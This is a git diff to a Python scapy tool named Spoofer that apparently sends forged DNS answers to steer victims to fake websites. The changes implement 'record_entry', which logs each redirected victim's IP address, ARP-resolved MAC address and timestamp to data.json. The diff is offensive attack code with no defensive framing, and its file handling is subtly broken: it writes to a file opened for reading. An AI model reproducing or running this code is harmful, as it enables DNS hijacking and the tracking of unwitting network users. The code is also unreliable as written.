@@ -6,7 +6,7 @@ from scapy.layers.dns import DNS,DNSQR,DNSRR
 import scapy.all as scapy
 
 import json
-
+import time
 
 
 class Spoofer:
@@ -47,7 +47,7 @@ class Spoofer:
         scapy.send(packet, verbose=False)
 
     def get_mac(self,ip: str):
-        """Get mac of the router using actual ARP.
+        """Get mac of the ip using ARP.
 
         Args:
             ip (str): ipv4 of the target.
@@ -79,7 +79,7 @@ class Spoofer:
             urls: dict[str,str] = self.get_urls()
             if domain in urls.keys():
                 response_packet = self.nslookup(urls[domain])
-                self.register(domain,packet)
+                self.record_entry(domain,packet)
             else:
                 response_packet = self.nslookup(domain)
                 
@@ -98,11 +98,25 @@ class Spoofer:
         # Dump all corresponding packets into process_packet to handle.
 
     
-    def register(self,fake_url,packet):
+    def record_entry(self,fake_url,packet):
         """
         register connection to fake website. note the IP, and such.
         """
-        raise NotImplementedError
+        with open("data.json", 'r') as f:
+            data: dict[str,list[dict]] = json.load(f)
+        
+        data[fake_url].append(self.build_dict_from_packet(packet))
+        
+        with open("data.json" ,'r') as f:
+            json.dump(data,f)
+    
+    
+    def build_dict_from_packet(self,packet) -> dict:
+        d: dict = {}
+        d["Time"] = str(time.time())
+        d["IP"] = packet[IP].src
+        d["MAC address"] = self.get_mac(d["IP"])
+        return d
     
     
     def get_urls(self) -> dict[str,str]:
